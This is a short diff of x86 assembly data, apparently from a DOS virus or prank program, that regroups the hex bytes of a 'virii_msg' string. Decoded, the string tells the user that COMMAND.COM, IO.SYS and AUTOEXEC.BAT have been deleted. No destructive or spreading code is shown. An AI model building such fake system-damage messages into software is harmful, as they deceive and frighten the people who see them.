@@ -1,13 +1,14 @@
 virii_msg:
-	db 43h, 4fh, 4dh, 4dh, 41h, 4eh, 44h, 2eh, 43h
-	db 4fh, 4dh, 20h, 20h, 20h, 20h, 20h, 20h
-	db 20h, 20h, 20h, 20h, 20h, 20h, 20h, 2dh
-	db 20h, 5bh, 44h, 45h, 4ch, 45h, 54h, 45h
-	db 44h, 5dh, 0dh, 0ah, 49h, 4fh, 2eh, 53h
-	db 59h, 53h, 20h, 20h, 20h, 20h, 20h, 20h
+	db 43h, 4fh, 4dh, 4dh, 41h, 4eh, 44h, 2eh
+	db 43h, 4fh, 4dh, 20h, 20h, 20h, 20h, 20h
 	db 20h, 20h, 20h, 20h, 20h, 20h, 20h, 20h
-	db 20h, 20h, 20h, 20h, 2dh, 20h, 5bh, 44h
-	db 45h, 4ch, 45h, 54h, 45h, 44h, 5dh, 0dh, 0ah, 41h, 55h, 54h, 4fh, 45h, 58h, 45h
+	db 2dh, 20h, 5bh, 44h, 45h, 4ch, 45h, 54h
+	db 45h, 44h, 5dh, 0dh, 0ah, 49h, 4fh, 2eh
+	db 53h, 59h, 53h, 20h, 20h, 20h, 20h, 20h
+	db 20h, 20h, 20h, 20h, 20h, 20h, 20h, 20h
+	db 20h, 20h, 20h, 20h, 20h, 2dh, 20h, 5bh
+	db 44h, 45h, 4ch, 45h, 54h, 45h, 44h, 5dh
+	db 0ah, 41h, 55h, 54h, 4fh, 45h, 58h, 45h
 	db 43h, 2eh, 42h, 41h, 54h, 20h, 20h, 20h
 	db 20h, 20h, 20h, 20h, 20h, 20h, 20h, 20h
 	db 20h, 2dh, 20h, 5bh, 44h, 45h, 4ch, 45h
